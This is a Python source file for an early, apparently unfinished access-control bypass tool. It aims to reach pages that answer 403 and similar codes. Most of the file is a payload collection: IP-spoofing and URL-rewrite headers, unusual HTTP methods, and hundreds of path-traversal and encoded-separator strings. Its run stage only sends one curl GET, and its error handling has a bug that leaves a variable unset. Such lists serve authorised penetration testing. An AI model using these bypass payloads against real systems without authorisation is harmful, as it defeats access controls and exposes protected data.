#!/usr/bin/env python3
"""Bypass Url Parser, made with love by @TheLaluka
A tool that tests MANY url bypasses to reach a 40X protected page.

Usage:
    ./bypass-url-parser.py --url=<URL> [--outdir=<OUTDIR>] [--debug]
    ./bypass-url-parser.py (-h | --help)
    ./bypass-url-parser.py (-v | --version)

Options:
    -h --help            Show help, you are here :)
    -v --version         Show version info.
    --url=<URL>          URL (path is optional) to run bypasses against.
    --outdir=<outdir>    Output directory for results.
    --debug              Enable debugging output, to... Tou know... Debug.

Example:
    ./bypass-url-parser.py --url http://127.0.0.1/juicy_403_endpoint/
"""

from docopt import docopt
from pathlib import Path
from rich import print
import coloredlogs
import logging
import subprocess
import sys
import tempfile
import urllib

VERSION = "0.1.0"
logger = logging.getLogger("bup")
config = dict()

const_internal_ips = list()
const_internal_ips.append("0.0.0.0")
const_internal_ips.append("127.0.0.1")
const_internal_ips.append("localhost")
const_internal_ips.append("norealhost")

const_http_methods = list()
const_http_methods.append("CONNECT")
const_http_methods.append("GET")
const_http_methods.append("LOCK")
const_http_methods.append("OPTIONS")
const_http_methods.append("PATCH")
const_http_methods.append("POST")
const_http_methods.append("PUT")
const_http_methods.append("TRACE")
const_http_methods.append("TRACK")
const_http_methods.append("UPDATE")

const_header_scheme = list()
const_header_scheme.append("X-Forwarded-Scheme") # http https
const_header_port = list()
const_header_port.append("X-Forwarded-Port")#  443 4443 80 8080 8443
const_header_host = list()
const_header_host.append("Access-Control-Allow-Origin")
const_header_host.append("Base-Url")
const_header_host.append("CF-Connecting_IP")
const_header_host.append("CF-Connecting-IP")
const_header_host.append("Client-IP")
const_header_host.append("Content-Length")
const_header_host.append("Destination")
const_header_host.append("Forwarded")
const_header_host.append("Forwarded-For")
const_header_host.append("Forwarded-For-IP")
const_header_host.append("Host")
const_header_host.append("Http-Url")
const_header_host.append("Origin")
const_header_host.append("Profile")
const_header_host.append("Proxy")
const_header_host.append("Proxy-Host")
const_header_host.append("Proxy-Url")
const_header_host.append("Real-Ip")
const_header_host.append("Redirect")
const_header_host.append("Referer")
const_header_host.append("Referrer")
const_header_host.append("Request-Uri")
const_header_host.append("True-Client-IP")
const_header_host.append("Uri")
const_header_host.append("Url")
const_header_host.append("X-Arbitrary")
const_header_host.append("X-Client-IP")
const_header_host.append("X-Custom-IP-Authorization")
const_header_host.append("X-Forward-For")
const_header_host.append("X-Forwarded")
const_header_host.append("X-Forwarded-By")
const_header_host.append("X-Forwarded-For")
const_header_host.append("X-Forwarded-For-Original")
const_header_host.append("X-Forwarded-Host")
const_header_host.append("X-Forwarded-Proto")
const_header_host.append("X-Forwarded-Server")
const_header_host.append("X-Forwarder-For")
const_header_host.append("X-Host")
const_header_host.append("X-Http-Destinationurl")
const_header_host.append("X-HTTP-DestinationURL")
const_header_host.append("X-Http-Host-Override")
const_header_host.append("X-OReferrer")
const_header_host.append("X-Original-Remote-Addr")
const_header_host.append("X-Original-URL")
const_header_host.append("X-Originally-Forwarded-For")
const_header_host.append("X-Originating-")
const_header_host.append("X-Originating-IP")
const_header_host.append("X-Proxy-Url")
const_header_host.append("X-ProxyUser-Ip")
const_header_host.append("X-Real-Ip")
const_header_host.append("X-Remote-Addr")
const_header_host.append("X-Remote-IP")
const_header_host.append("X-Rewrite-URL")
const_header_host.append("X-WAP-Profile")

const_path = list()
const_path.append(";")
const_path.append(";/.;.")
const_path.append(";/..")
const_path.append(";/..;")
const_path.append(";/../")
const_path.append(";/../;/")
const_path.append(";/../;/../")
const_path.append(";/../.;/../")
const_path.append(";/../../")
const_path.append(";/../..//")
const_path.append(";/.././../")
const_path.append(";/..//")
const_path.append(";/..//../")
const_path.append(";/..///")
const_path.append(";/..//%2e%2e/")
const_path.append(";/..//%2f")
const_path.append(";/../%2f/")
const_path.append(";/..%2f")
const_path.append(";/..%2f..%2f")
const_path.append(";/..%2f/")
const_path.append(";/..%2f//")
const_path.append(";/..%2f%2f../")
const_path.append(";/.%2e")
const_path.append(";/.%2e/%2e%2e/%2f")
const_path.append(";//..")
const_path.append(";//../../")
const_path.append(";///..")
const_path.append(";///../")
const_path.append(";///..//")
const_path.append(";//%2f../")
const_path.append(";/%2e.")
const_path.append(";/%2e%2e")
const_path.append(";/%2e%2e/")
const_path.append(";/%2e%2e%2f/")
const_path.append(";/%2e%2e%2f%2f")
const_path.append(";/%2f/../")
const_path.append(";/%2f/..%2f")
const_path.append(";/%2f%2f../")
const_path.append(";%09")
const_path.append(";%09;")
const_path.append(";%09..")
const_path.append(";%09..;")
const_path.append(";%2f;/;/..;/")
const_path.append(";%2f;//../")
const_path.append(";%2f..")
const_path.append(";%2f..;/;//")
const_path.append(";%2f..;//;/")
const_path.append(";%2f..;///")
const_path.append(";%2f../;/;/")
const_path.append(";%2f../;/;/;")
const_path.append(";%2f../;//")
const_path.append(";%2f..//;/")
const_path.append(";%2f..//;/;")
const_path.append(";%2f..//../")
const_path.append(";%2f..//..%2f")
const_path.append(";%2f..///")
const_path.append(";%2f..///;")
const_path.append(";%2f../%2f../")
const_path.append(";%2f../%2f..%2f")
const_path.append(";%2f..%2f..%2f%2f")
const_path.append(";%2f..%2f/")
const_path.append(";%2f..%2f/../")
const_path.append(";%2f..%2f/..%2f")
const_path.append(";%2f..%2f%2e%2e%2f%2f")
const_path.append(";%2f/;/..;/")
const_path.append(";%2f/;/../")
const_path.append(";%2f//..;/")
const_path.append(";%2f//../")
const_path.append(";%2f//..%2f")
const_path.append(";%2f/%2f../")
const_path.append(";%2f%2e%2e")
const_path.append(";%2f%2e%2e%2f%2e%2e%2f%2f")
const_path.append(";%2f%2f/../")
const_path.append(";x")
const_path.append(";x;")
const_path.append(";x/")
const_path.append("?")
const_path.append("??")
const_path.append("???")
const_path.append("..")
const_path.append("..;/")
const_path.append("..;\\;")
const_path.append("..;\\\\")
const_path.append("..;%00/")
const_path.append("..;%0d/")
const_path.append("..;%ff/")
const_path.append("../")
const_path.append(".././")
const_path.append("..\\;")
const_path.append("..\\\\")
const_path.append("..%00;/")
const_path.append("..%00/")
const_path.append("..%00/;")
const_path.append("..%09")
const_path.append("..%0d;/")
const_path.append("..%0d/")
const_path.append("..%0d/;")
const_path.append("..%2f")
const_path.append("..%5c")
const_path.append("..%5c/")
const_path.append("..%ff")
const_path.append("..%ff;/")
const_path.append("..%ff/;")
const_path.append("./.")
const_path.append(".//./")
const_path.append(".%2e/")
const_path.append(".html")
const_path.append(".json")
const_path.append("/")
const_path.append("/;/")
const_path.append("/;//")
const_path.append("/;x")
const_path.append("/;x/")
const_path.append("/.")
const_path.append("/.;/")
const_path.append("/.;//")
const_path.append("/..")
const_path.append("/..;/")
const_path.append("/..;/;/")
const_path.append("/..;/;/..;/")
const_path.append("/..;/..;/")
const_path.append("/..;/../")
const_path.append("/..;//")
const_path.append("/..;//..;/")
const_path.append("/..;//../")
const_path.append("/..;%2f")
const_path.append("/..;%2f..;%2f")
const_path.append("/..;%2f..;%2f..;%2f")
const_path.append("/../")
const_path.append("/../;/")
const_path.append("/../;/../")
const_path.append("/../.;/../")
const_path.append("/../..;/")
const_path.append("/../../")
const_path.append("/../../../")
const_path.append("/../../..//")
const_path.append("/../..//")
const_path.append("/../..//../")
const_path.append("/.././../")
const_path.append("/..//")
const_path.append("/..//..;/")
const_path.append("/..//../")
const_path.append("/..//../../")
const_path.append("/..%2f")
const_path.append("/..%2f..%2f")
const_path.append("/..%2f..%2f..%2f")
const_path.append("/./")
const_path.append("/.//")
const_path.append("/.randomstring")
const_path.append("/*")
const_path.append("/*/")
const_path.append("//")
const_path.append("//;/")
const_path.append("//?anything")
const_path.append("//.")
const_path.append("//.;/")
const_path.append("//..")
const_path.append("//..;")
const_path.append("//../../")
const_path.append("//./")
const_path.append("///..")
const_path.append("///..;")
const_path.append("///..;/")
const_path.append("///..;//")
const_path.append("///../")
const_path.append("///..//")
const_path.append("////")
const_path.append("/%20#")
const_path.append("/%20%20/")
const_path.append("/%20%23")
const_path.append("/%252e/")
const_path.append("/%252e%252e%252f/")
const_path.append("/%252e%252e%253b/")
const_path.append("/%252e%252f/")
const_path.append("/%252e%253b/")
const_path.append("/%252f")
const_path.append("/%2e/")
const_path.append("/%2e//")
const_path.append("/%2e%2e")
const_path.append("/%2e%2e/")
const_path.append("/%2e%2e%3b/")
const_path.append("/%2e%2f/")
const_path.append("/%2e%3b/")
const_path.append("/%2e%3b//")
const_path.append("/%2f")
const_path.append("/%3b/")
const_path.append("/x/;/..;/")
const_path.append("/x/;/../")
const_path.append("/x/..;/")
const_path.append("/x/..;/;/")
const_path.append("/x/..;//")
const_path.append("/x/../")
const_path.append("/x/../;/")
const_path.append("/x/..//")
const_path.append("/x//..;/")
const_path.append("/x//../")
const_path.append("\\..\\.\\")
const_path.append("&")
const_path.append("#")
const_path.append("#?")
const_path.append("%")
const_path.append("%09")
const_path.append("%09;")
const_path.append("%09..")
const_path.append("%09%3b")
const_path.append("%20")
const_path.append("%20/")
const_path.append("%23")
const_path.append("%23%3f")
const_path.append("%252f/")
const_path.append("%252f%252f")
const_path.append("%26")
const_path.append("%2e")
const_path.append("%2e%2e")
const_path.append("%2e%2e/")
const_path.append("%2e%2e%2f")
const_path.append("%2f")
const_path.append("%2f/")
const_path.append("%2f%20%23")
const_path.append("%2f%23")
const_path.append("%2f%2f")
const_path.append("%2f%3b%2f")
const_path.append("%2f%3b%2f%2f")
const_path.append("%2f%3f")
const_path.append("%2f%3f/")
const_path.append("%3b")
const_path.append("%3b/..")
const_path.append("%3b//%2f../")
const_path.append("%3b/%2e.")
const_path.append("%3b/%2e%2e/..%2f%2f")
const_path.append("%3b/%2f%2f../")
const_path.append("%3b%09")
const_path.append("%3b%2f..")
const_path.append("%3b%2f%2e.")
const_path.append("%3b%2f%2e%2e")
const_path.append("%3b%2f%2e%2e%2f%2e%2e%2f%2f")
const_path.append("%3f")
const_path.append("%3f%23")
const_path.append("%3f%3f")


class Bypasser:
    def __init__(self, config):
        self.url = config.get("url")
        self.outdir = config.get("outdir")
        self.debug = config.get("debug")

    def __str__(self):
        out = str()
        out += f"url: {self.url}"
        out += f"outdir: {self.outdir}"
        out += f"debug: {self.debug}"
        return out

    def generate_curls(self):
        logger.warning("Stage: generate_curls")
        return

    def run_curls(self):
        logger.warning("Stage: run_curls")
        # import ipdb; ipdb.set_trace()
        cmd = ["curl", "-sS", "-kg", "--path-as-is", "-o", "/tmp/out.log", "-w", "Status: %{http_code}, Length: %{size_download}", "-X", "GET", "-H", "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36", config["url"].geturl()]
        try:
            some_curl = subprocess.check_output(cmd, timeout=2).decode()
        except subprocess.CalledProcessError as e:
            logger.warn(f"command '{e.cmd}' returned on-zero error code {e.returncode}: {e.output}")
        except subprocess.TimeoutExpired as e:
            logger.warn(f"command '{e.cmd}' timed out: {e.output}")
        logger.info(some_curl)
        return

    def save_and_quit(self):
        logger.warning("Stage: save_and_quit")
        # path_routes = config["outdir"] + "/all-routes.json"
        # with open(path_routes, "w") as f:
        #     f.write(json.dumps(config["routes"], indent=4, sort_keys=True))
        # 
        # path_urls = config["outdir"] + "/all-urls.lst"
        # with open(path_urls, "w") as f:
        #     f.write("\n".join(sorted(set(config["final_urls"]))))
        # 
        # logger.info(f"Saving routes & urls in: \n{path_routes}\n{path_urls}")
        # logger.debug(config["final_urls"])
        return


def main():
    global config
    # Show all options by Default
    if len(sys.argv) == 1:
        sys.argv.append("-h")
    arguments = docopt(__doc__, version=f"bypass-url-parser {VERSION}")

    # debug
    config["debug"] = arguments.get("--debug")

    # Log level
    coloredlogs.install(
        logger=logger, level=logging.DEBUG if config["debug"] else logging.INFO
    )

    if config["debug"]:
        logger.debug(f"arguments: {arguments}")

    try:
        config["url"] = urllib.parse.urlparse(arguments.get("--url"))
    except Exception as e:
        logger.error(f"Couldn't parse url, found {arguments.get('--url')}")
        logger.error(e)
        exit(42)

    # outdir
    try:
        if not arguments.get("--outdir"):
            config["outdir"] = (f"{tempfile.TemporaryDirectory().name}-bypass-url-parser")
        else:
            config["outdir"] = arguments.get("--outdir")
        Path(config["outdir"]).mkdir(parents=True, exist_ok=True)
    except Exception as e:
        logger.error("Error while creating output directory")
        logger.error(e)
        exit(42)

    logger.info("=== Config ===")
    for key, val in config.items():
        logger.info(f"{key}: {val}")

    exporter = Bypasser(config)
    exporter.generate_curls()
    exporter.run_curls()
    exporter.save_and_quit()


if __name__ == "__main__":
    main()
